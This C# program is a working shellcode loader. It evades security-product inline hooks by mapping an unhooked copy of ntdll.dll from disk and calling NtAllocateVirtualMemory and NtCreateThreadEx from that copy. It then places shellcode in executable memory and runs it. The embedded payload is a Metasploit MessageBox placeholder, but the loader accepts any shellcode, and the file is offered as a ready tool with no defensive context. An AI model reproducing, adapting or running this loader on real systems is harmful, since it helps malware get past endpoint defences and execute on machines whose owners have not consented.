using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static NewNtdllBypassInlineHook.NativeFunctions;
using static NewNtdllBypassInlineHook.NativeStructs;


namespace NewNtdllBypassInlineHook
{
	class Program
	{

		public static uint InvokeCode(byte[] buffer)
        {
			string filename_path = "c:\\windows\\system32\\ntdll.dll";
			IntPtr CurrentProcess_handle = Process.GetCurrentProcess().Handle;

			IntPtr NtdllFile_handle = CreateFileA(
				filename_path, 
				EFileAccess.GenericRead, 
				EFileShare.Read, 
				IntPtr.Zero, 
				EFileMode.OpenExisting, 
				0,
				IntPtr.Zero);

			IntPtr NtdllMapping_handle = CreateFileMapping(
				NtdllFile_handle, 
				IntPtr.Zero, 
				FileMapProtection.PageReadonly | FileMapProtection.SectionImage, 
				0, 
				0, 
				null);

			// IntPtr MapViewOfFile_address = MapViewOfFile(Mapping_handle, FileMapAccessType.Write, 0, 0, (uint)buf1.Length);
			// LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);
			IntPtr NtdllMapViewOfFile_address = MapViewOfFile(NtdllMapping_handle, FileMapAccessType.Read, 0, 0, 0);

			IntPtr Func_address = IntPtr.Zero;
			Func_address = MainFunctions.Export_Function_Address(NtdllMapViewOfFile_address, "NtAllocateVirtualMemory");
			DelegatesFunctions.DFNtAllocateVirtualMemory NtAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(
				Func_address, 
				typeof(DelegatesFunctions.DFNtAllocateVirtualMemory)) as DelegatesFunctions.DFNtAllocateVirtualMemory;

			IntPtr pMemoryAllocation = IntPtr.Zero;
			IntPtr pZeroBits = IntPtr.Zero;
			UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(buffer.Length));

			/*
			uint MEM_COMMIT = 0x1000;
			uint MEM_RESERVE = 0x2000;
			uint PAGE_EXECUTE_READWRITE = 0x00000040;
			*/
			uint ntstatus = 0;

			ntstatus = NtAllocateVirtualMemory(
				CurrentProcess_handle,
				ref pMemoryAllocation,
				pZeroBits,
				ref pAllocationSize,
				0x1000 | 0x2000,
				0x00000040
			);

			Marshal.Copy(buffer, 0, (IntPtr)(pMemoryAllocation), buffer.Length);

			Func_address = MainFunctions.Export_Function_Address(NtdllMapViewOfFile_address, "NtCreateThreadEx");
			DelegatesFunctions.DFNtCreateThreadEx NtCreateThreadEx = Marshal.GetDelegateForFunctionPointer(
				Func_address,
				typeof(DelegatesFunctions.DFNtCreateThreadEx)) as DelegatesFunctions.DFNtCreateThreadEx;

			IntPtr Thread_handle = IntPtr.Zero;
			uint STANDARD_RIGHTS_ALL = 0x001F0000;
			uint SPECIFIC_RIGHTS_ALL = 0x0000FFFF;

			ntstatus = NtCreateThreadEx(
				out Thread_handle,
				STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL,
				IntPtr.Zero,
				CurrentProcess_handle,
				pMemoryAllocation,
				IntPtr.Zero,
				false,
				0,
				0xFFFF,
				0xFFFF,
				IntPtr.Zero
			 );

			Func_address = MainFunctions.Export_Function_Address(NtdllMapViewOfFile_address, "NtWaitForSingleObject");
			DelegatesFunctions.DFNtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(
				Func_address,
				typeof(DelegatesFunctions.DFNtWaitForSingleObject)) as DelegatesFunctions.DFNtWaitForSingleObject;

			ntstatus = NtWaitForSingleObject(Thread_handle, true, 0);

			return ntstatus;
		}

		public static uint InvokeMain()
        {
			/* MessageBox */
			byte[] buf1 = new byte[323] {
				0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
				0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
				0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
				0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
				0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
				0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
				0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
				0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
				0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
				0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
				0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
				0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
				0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
				0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
				0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
				0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
				0x85,0x2b,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
				0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
				0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
				0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x48,0x65,0x6c,0x6c,0x6f,
				0x2c,0x20,0x66,0x72,0x6f,0x6d,0x20,0x4d,0x53,0x46,0x21,0x00,0x4d,0x65,0x73,
				0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };

			uint ntstats = InvokeCode(buf1);
			return ntstats;
		}

		static void Main(string[] args)
        {
			uint ntstatus = InvokeMain();

			if (ntstatus != 0)
            {
				Console.WriteLine("ERRORs");
            }

		}
    }
}
